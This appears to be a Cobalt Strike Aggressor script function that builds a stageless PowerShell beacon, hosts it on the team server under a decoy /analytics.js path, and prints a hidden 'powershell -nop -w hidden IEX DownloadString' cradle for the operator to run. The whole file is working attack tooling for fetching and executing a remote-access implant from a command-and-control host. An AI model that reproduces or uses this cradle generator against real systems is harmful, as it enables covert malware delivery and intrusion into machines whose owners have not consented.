sub createDownloadString {
    local ('$listener $script $host $url'); # Local variables for this function
    
    # Check if DownloadString already exists
    if (-istrue getDownloadString()){
        println("DownloadString already exists!");
        return;
    }
    # If it does not, create it
    else {
        $listener = $1; # Listener to run on

        $host = listener_info($listener)['host']; # Get host of listener

        artifact_stageless($listener, "powershell", "x86", $null, $this); # Create stageless powershell artifact
        yield;

        $script = $1; # Get script variable

        $url = site_host($host, "443", "/analytics.js", $script, "text/plain", "Scripted Web Delivery(powershell)"); # Create URL for downloadstring
        $url = strrep($url, "http", "https"); # Replace http with https

        $downloadString = "powershell.exe -nop -w hidden -c \"IEX ((New-Object Net.WebClient).DownloadString('"; # Create DownloadString cradle
        $downloadString .= $url . "'))\""; # End DownloadString cradle

        # println("Returning DownloadString $downloadString");
        say("Here's your DownloadString: \c9$downloadString\o"); # Print DownloadString
    }
}